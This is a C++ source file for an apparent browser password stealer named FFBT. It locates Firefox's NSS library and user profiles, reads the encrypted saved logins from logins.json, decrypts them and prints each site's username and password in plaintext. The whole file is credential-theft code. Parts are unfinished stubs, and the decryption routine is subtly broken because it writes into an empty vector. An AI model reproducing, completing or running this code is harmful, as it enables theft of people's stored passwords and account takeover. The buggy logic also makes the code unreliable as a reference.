#include "ffbt.hxx"

std::filesystem::path get_nss_location()
{
    std::cout << "\nSearching for nss3.dll...\n";
    std::vector<std::string> mozilla_dirs {
        "Mozilla Firefox", "Firefox Developer Edition",
        "Nightly", "Mozilla Thunderbird",
        "SeaMonkey", "Waterfox"
    };

    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL, &local_appdata_path);;
    
    std::filesystem::path local_path = local_appdata_path.get(),
                          root_path = "C:\\Program Files";

    for (auto dir : mozilla_dirs)
    {
        if (std::filesystem::exists(local_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (local_path / dir).string() << "\n\n";
            return local_path / dir;
        }
        if (std::filesystem::exists(root_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (root_path / dir).string() << "\n\n";
            return root_path / dir;
        }
    }
    std::cout << "[-] Could not find NSS :( Exiting...\n\n";
    exit(1);
}


std::vector<std::filesystem::path> get_valid_profiles()
{
    std::cout << "Searching for Profiles...\n";
    // C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/
    wil::unique_cotaskmem_string roaming_appdata_path;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_DONT_UNEXPAND, NULL, &roaming_appdata_path);
    std::filesystem::path prof_path = roaming_appdata_path.get();
    prof_path =  prof_path / "Mozilla" / "Firefox" / "Profiles";

    // could read profiles.ini or just check each dir in Profiles folder.
    // profiles.ini is a better practice i guess
    // check for signon.sqlite or login.json
    // add profile to vector if valid
    std::vector<std::filesystem::path> valid_profile_list;
    for (const auto & entry : std::filesystem::directory_iterator(prof_path)) {
        std::cout << "Profile found: " << entry.path() << "\n";
        if (std::filesystem::exists(entry.path() / "logins.json") ||
            std::filesystem::exists(entry.path() / "signons.sqlite"))
        {
            std::cout << "[+] Valid Profile\n";
            valid_profile_list.push_back(entry.path());
        }
        else
        {
            std::cout << "[-] Bad Profile\n";
        }
    }
    return valid_profile_list;
}


int FFBT::retrieve_credentials(std::filesystem::path profile_path, int output_type)
{
    std::vector<std::vector<std::string>> encrypted_creds;
    try {
        // check if file exists then throw if not
        encrypted_creds = get_json_credentials(profile_path / "logins.json");
        if (encrypted_creds.empty()) {
            std::cerr << "logins.json exists but is empty or something really fucked up\n";
            return 1;
        }
    }
    catch (const nlohmann::json::exception & e) {
        std::cerr << "Error reading logins.json, checking for sqlite database\nError: " << e.what() << std::endl;
        try {
            //get_sqlite_credentials(profile_path / "signons.sqlite");
        }
        catch (...) { // TODO: specific exception
            std::cerr << "Could not retrieve any credentials\n";
            return 1;
        }
    }
    //std::cout << "Successfully retrieved credentials\n";
    std::cout << "\n=========== ENCRYPTED ===========\n";
    for (auto& login : encrypted_creds) {
        std::cout << "Hostname: " << login[0] << std::endl;
        std::cout << "Encrypted username: " << login[1] << std::endl;
        std::cout << "Encrypted password: " << login[2] << std::endl;
        std::cout << "Encryption type: " << login[3] << std::endl;
    }

    std::vector<std::vector<std::string>> decrypted_creds = decrypt_credentials(encrypted_creds);
    if (output_type == 1 || output_type == 2) {
        if (output_credentials(decrypted_creds, output_type) == 1) {
            std::cerr << "Unable to output credentials fo type '" << output_type << "'\n";
        }
    }
    return 0;
}


std::vector<std::vector<std::string>> FFBT::get_json_credentials(std::filesystem::path logins_path)
{
    std::ifstream login_file(logins_path.string());
    using json = nlohmann::json;
    json data = json::parse(login_file);
    
    std::vector<std::vector<std::string>> logins;
    std::vector<std::string> LD;

    for (auto &login : data["logins"]) {
        LD.push_back(login["hostname"]);
        LD.push_back(login["encryptedUsername"]);
        LD.push_back(login["encryptedPassword"]);
        LD.push_back(std::to_string((int)login["encType"]));
        logins.push_back(LD);
        LD.clear();
    }
    return logins;
}

std::vector<std::vector<std::string>> FFBT::get_sqlite_credentials(std::filesystem::path signons_path)
{
    std::vector<std::vector<std::string>> out;
    return out;
}

std::vector<std::vector<std::string>> FFBT::decrypt_credentials(std::vector<std::vector<std::string>> encrypted_creds)
{
    std::vector<std::vector<std::string>> out; int site_d = 0;

    for (auto &site_e : encrypted_creds)
    {
        if (std::stoi(site_e[3])) { // if it has encryption
            try {
                out[site_d][0] = site_e[0];
                out[site_d][1] = Decrypt(site_e[1]);
                out[site_d][2] = Decrypt(site_e[2]);
            }
            catch (const std::exception& e) {
                std::cerr << "Decryption failed for '" << site_e[0] << "' with Error: " << e.what() << "\n";
                ++site_d; continue;
            }
        }
        else {
            //std::cout << "[+] Username and Password are not encrypted\n";
            out[site_d][1] = site_e[1];
            out[site_d][2] = site_e[2];
        }
        ++site_d;
    }
    std::cout << "\n\n=========== DECRYPTED ===========\n";
    for (auto &site : out)
    {
        std::cout << "url: " << site[0] << "\n"
             << "username: " << site[1] << "\n"
             << "password: " << site[2] << "\n\n";
    }
    return out;
}

int FFBT::output_credentials(std::vector<std::vector<std::string>> decrypted_creds, int output_type)
{
    if (output_type == 1) {
        //trycatch
        //txt file
    }
    else if (output_type == 2) {
        //trycatch
        //json file
    }
    else {
        // not a valid output option, outputting as txt
        return 1;
    }
    return 0;
}